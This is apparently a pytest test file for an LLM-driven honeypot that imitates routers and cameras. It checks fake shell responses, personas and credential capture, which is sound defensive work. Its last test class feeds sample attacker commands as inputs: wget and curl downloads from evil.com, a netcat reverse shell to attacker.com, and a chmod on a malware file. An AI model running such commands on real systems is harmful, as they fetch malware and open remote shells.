"""
LLM Honeypot Response Tests
===========================

Tests to verify that the LLM honeypot generates appropriate
responses for attacker commands.

Tests include:
- Static response generation
- Persona-specific responses
- Credential capture
- Command logging
"""

import pytest
import sys
from pathlib import Path
from unittest.mock import Mock, patch

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))


class TestStaticResponses:
    """Test static response generation for common commands."""

    def test_static_response_passwd(self, mock_llm_honeypot):
        """Should return fake /etc/passwd content."""
        response = mock_llm_honeypot.generate_response("cat /etc/passwd")

        assert "root" in response
        assert "x:0:0" in response  # root user format
        print(f"passwd response: {response[:100]}...")

    def test_static_response_whoami(self, mock_llm_honeypot):
        """Should return 'root' for whoami."""
        response = mock_llm_honeypot.generate_response("whoami")

        assert response.strip() == "root"

    def test_static_response_uname(self, mock_llm_honeypot):
        """Should return Linux system info for uname."""
        response = mock_llm_honeypot.generate_response("uname -a")

        assert "Linux" in response
        print(f"uname response: {response}")

    def test_static_response_id(self, mock_llm_honeypot):
        """Should return root uid for id command."""
        response = mock_llm_honeypot.generate_response("id")

        assert "uid=0" in response
        assert "root" in response

    def test_static_response_ls(self, mock_llm_honeypot):
        """Should return directory listing for ls."""
        response = mock_llm_honeypot.generate_response("ls -la")

        assert "total" in response
        assert "drwx" in response

    def test_static_response_pwd(self, mock_llm_honeypot):
        """Should return current directory for pwd."""
        response = mock_llm_honeypot.generate_response("pwd")

        assert "/" in response

    def test_unknown_command_response(self, mock_llm_honeypot):
        """Unknown commands should return 'command not found'."""
        response = mock_llm_honeypot.generate_response("some_unknown_command")

        assert "command not found" in response.lower() or "not found" in response.lower()


class TestPersonaBanner:
    """Test persona-specific banner generation."""

    def test_get_banner(self, mock_llm_honeypot):
        """Should return device-specific banner."""
        banner = mock_llm_honeypot.get_banner()

        assert banner is not None
        assert len(banner) > 0
        print(f"Banner: {banner}")


class TestCredentialCapture:
    """Test credential capture functionality."""

    def test_credential_capture_called(self, mock_llm_honeypot):
        """Credential capture should be callable."""
        mock_llm_honeypot.capture_credentials("admin", "password123")

        mock_llm_honeypot.capture_credentials.assert_called_once_with("admin", "password123")

    def test_validate_credentials_returns_false(self, mock_llm_honeypot):
        """Credentials should always be invalid (it's a honeypot)."""
        result = mock_llm_honeypot.validate_credentials("admin", "password")

        # Honeypot should accept but mark as invalid for real access
        assert result == False


class TestLLMHoneypotIntegration:
    """Integration tests for LLM honeypot with real module."""

    def test_llm_honeypot_initialization(self, test_config):
        """Test LLM honeypot can be initialized."""
        try:
            from core.llm_honeypot import LLMHoneypot
            llm = LLMHoneypot(test_config)
            assert llm is not None
        except ImportError:
            pytest.skip("LLMHoneypot not available")
        except Exception as e:
            # May fail if Ollama not running, that's OK for basic test
            if "ollama" in str(e).lower() or "connection" in str(e).lower():
                pytest.skip(f"Ollama not available: {e}")
            raise

    def test_static_responses_available(self, test_config):
        """Verify static responses are defined."""
        try:
            from core.llm_honeypot import LLMHoneypot
            llm = LLMHoneypot(test_config)

            # Check if static responses exist
            if hasattr(llm, 'static_responses') or hasattr(llm, 'STATIC_RESPONSES'):
                assert True
            else:
                # May use generate_response directly
                assert hasattr(llm, 'generate_response')
        except ImportError:
            pytest.skip("LLMHoneypot not available")
        except Exception as e:
            if "ollama" in str(e).lower() or "connection" in str(e).lower():
                pytest.skip(f"Ollama not available: {e}")
            raise


class TestCommandProcessing:
    """Test command processing and normalization."""

    def test_command_case_insensitive(self, mock_llm_honeypot):
        """Commands should be handled case-insensitively."""
        response1 = mock_llm_honeypot.generate_response("WHOAMI")
        response2 = mock_llm_honeypot.generate_response("whoami")

        # Both should work (mock handles this)
        assert response1 is not None
        assert response2 is not None

    def test_command_whitespace_handling(self, mock_llm_honeypot):
        """Commands should handle leading/trailing whitespace."""
        response = mock_llm_honeypot.generate_response("  whoami  ")

        assert response is not None


class TestSessionContext:
    """Test session context handling."""

    def test_generate_with_session_context(self, mock_llm_honeypot):
        """Response generation should accept session context."""
        context = {
            "username": "admin",
            "commands_history": ["ls", "pwd"],
            "session_duration": 30
        }

        response = mock_llm_honeypot.generate_response(
            "whoami",
            persona="tp_link",
            session_context=context
        )

        assert response is not None


class TestPersonaResponses:
    """Test persona-specific response variations."""

    def test_tp_link_persona_response(self, mock_llm_honeypot):
        """TP-Link persona should return router-like responses."""
        response = mock_llm_honeypot.generate_response(
            "uname -a",
            persona="tp_link"
        )

        assert response is not None

    def test_wyze_cam_persona_response(self, mock_llm_honeypot):
        """Wyze Cam persona should return camera-like responses."""
        response = mock_llm_honeypot.generate_response(
            "uname -a",
            persona="wyze_cam"
        )

        assert response is not None


class TestSecurityCommands:
    """Test responses to security-related commands."""

    def test_wget_command(self, mock_llm_honeypot):
        """Should handle wget attempts."""
        response = mock_llm_honeypot.generate_response("wget http://evil.com/malware.sh")

        assert response is not None
        # Should not actually download anything

    def test_curl_command(self, mock_llm_honeypot):
        """Should handle curl attempts."""
        response = mock_llm_honeypot.generate_response("curl http://evil.com/backdoor")

        assert response is not None

    def test_nc_command(self, mock_llm_honeypot):
        """Should handle netcat attempts."""
        response = mock_llm_honeypot.generate_response("nc -e /bin/sh attacker.com 4444")

        assert response is not None

    def test_chmod_command(self, mock_llm_honeypot):
        """Should handle chmod attempts."""
        response = mock_llm_honeypot.generate_response("chmod 777 /tmp/malware")

        assert response is not None
